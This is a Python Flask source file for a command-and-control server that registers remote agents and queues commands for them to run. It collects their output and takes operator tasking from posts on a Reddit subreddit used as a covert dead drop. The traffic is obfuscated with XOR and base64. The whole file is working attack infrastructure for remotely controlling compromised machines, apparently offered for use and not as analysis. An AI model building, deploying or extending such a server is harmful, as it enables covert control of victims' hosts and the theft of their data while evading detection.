from flask import Flask, request, jsonify
from datetime import datetime
from threading import Thread
import time, json, praw, requests, base64

from models import db, Agent, Command, ProcessedPost

app = Flask(__name__)
app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///redc2.db"
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False

db.init_app(app)

with app.app_context():
    db.create_all()

# ----------------------------
# Register agent (first time)
# ----------------------------
@app.route("/register", methods=["POST"])
def register():
    data = request.get_json()
    agent_id = data.get("agent_id")
    hostname = data.get("hostname")

    if not agent_id:
        return jsonify({"error": "no agent_id provided"}), 400

    agent = Agent.query.get(agent_id)
    if not agent:
        # First time registration
        agent = Agent(
            agent_id=agent_id,
            hostname=hostname,
            last_seen=datetime.utcnow(),
            status="Alive"
        )
        db.session.add(agent)
    else:
        # Update existing agent info
        agent.hostname = hostname  # in case hostname changed
        agent.last_seen = datetime.utcnow()
        agent.status = "Alive"

    db.session.commit()

    return jsonify({"status": "registered", "agent_id": agent_id})

# ----------------------------
# Agent heartbeat (polling for commands)
# ----------------------------
@app.route("/heartbeat", methods=["POST"])
def heartbeat():
    data = request.get_json()
    agent_id = data.get("agent_id")

    if not agent_id:
        return jsonify({"error": "no agent_id provided"}), 400

    agent = Agent.query.get(agent_id)
    if agent:
        agent.last_seen = datetime.utcnow()
        db.session.commit()

    cmds = Command.query.filter_by(agent_id=agent_id, status="Queued").all()
    cmd_list = [{"command_id": c.id, "command": c.command} for c in cmds]

    return jsonify({
        "agent_id": agent_id,
        "commands": cmd_list
    })



# ----------------------------
# Agent sends command results
# ----------------------------
@app.route("/result", methods=["POST"])
def result():
    data = request.get_json()
    cmd_id = data.get("command_id")
    output = data.get("result")  # encrypted by agent

    if not cmd_id or output is None:
        return jsonify({"error": "command_id and result required"}), 400

    command = Command.query.get(cmd_id)
    if command:
        command.status = "Completed"
        # 🔹 decrypt before storing
        command.result = decrypt(output)  
        command.completed_at = datetime.utcnow()
        db.session.commit()

    return jsonify({"status": "result stored", "command_id": cmd_id})


# ----------------------------
# Operator queues a command (direct or via poller)
# ----------------------------
@app.route("/queue", methods=["POST"])
def queue_command():
    data = request.get_json()
    agent_id = data.get("agent_id")
    cmd_text = data.get("command")

    if not agent_id or not cmd_text:
        return jsonify({"error": "agent_id and command required"}), 400

    # 🔹 decrypt before storing in DB
    plain_cmd = decrypt(cmd_text)
    new_cmd = Command(agent_id=agent_id, command=plain_cmd, status="Queued")
    db.session.add(new_cmd)
    db.session.commit()

    return jsonify({
        "status": "queued",
        "agent_id": agent_id,
        "command": plain_cmd,
        "command_id": new_cmd.id
    })



# ----------------------------
# Poller checks if Reddit post processed
# ----------------------------
@app.route("/processed/<post_id>", methods=["GET"])
def check_processed(post_id):
    exists = ProcessedPost.query.get(post_id)
    if exists:
        return jsonify({"status": "processed", "post_id": post_id}), 200
    return jsonify({"status": "not_found"}), 404

# ----------------------------
# Poller marks Reddit post processed
# ----------------------------
@app.route("/processed", methods=["POST"])
def mark_processed():
    data = request.get_json()
    post_id = data.get("post_id")

    if not post_id:
        return jsonify({"error": "no post_id"}), 400

    if not ProcessedPost.query.get(post_id):
        db.session.add(ProcessedPost(post_id=post_id))
        db.session.commit()

    return jsonify({"status": "ok", "post_id": post_id})

@app.route("/agents", methods=["GET"])
def list_agents():
    agents = Agent.query.all()
    data = []
    for a in agents:
        data.append({
            "agent_id": a.agent_id,
            "hostname": a.hostname,
            "last_seen": a.last_seen.isoformat() if a.last_seen else None,
            "status": a.status
        })
    return jsonify(data)

# ----------------------------
# Reddit Poller (runs in background thread)
# ----------------------------
def poll_reddit():
    with open("config.json") as f:
        creds = json.load(f)

    reddit = praw.Reddit(
        client_id=creds["client_id"],
        client_secret=creds["client_secret"],
        username=creds["username"],
        password=creds["password"],
        user_agent=creds["user_agent"]
    )

    SERVER_URL = "http://127.0.0.1:5000"  # Flask local
    SUBREDDIT = "taskdropbox"

    while True:
        subreddit = reddit.subreddit(SUBREDDIT)
        for post in subreddit.new(limit=5):
            # Check if processed
            resp = requests.get(f"{SERVER_URL}/processed/{post.id}")
            if resp.status_code == 200:
                continue

            targets = [t.strip() for t in post.title.split(",") if t.strip()]
            commands = [c.strip() for c in post.selftext.split("\n") if c.strip()]

            for endpoint in targets:
                for command in commands:
                    payload = {"agent_id": endpoint, "command": encrypt(command)}
                    requests.post(f"{SERVER_URL}/queue", json=payload)

            # Mark post as processed
            requests.post(f"{SERVER_URL}/processed", json={"post_id": post.id})

        time.sleep(60)
        
def monitor_agents():
    while True:
        now = datetime.utcnow()
        with app.app_context():
            agents = Agent.query.all()
            for a in agents:
                delta = (now - a.last_seen).total_seconds()
                a.status = "Alive" if delta < 120 else "Dead"
            db.session.commit()
        time.sleep(30)
        
def xor(data: str, key="secret") -> str:
    return "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

def encrypt(data: str, key="secret") -> str:
    return base64.b64encode(xor(data, key).encode()).decode()

def decrypt(data: str, key="secret") -> str:
    return xor(base64.b64decode(data.encode()).decode(), key)



if __name__ == "__main__":
    print("[+] Starting C2 Server")

    Thread(target=poll_reddit, daemon=True).start()
    Thread(target=monitor_agents, daemon=True).start()

    app.run(host="0.0.0.0", port=5000, debug=True)
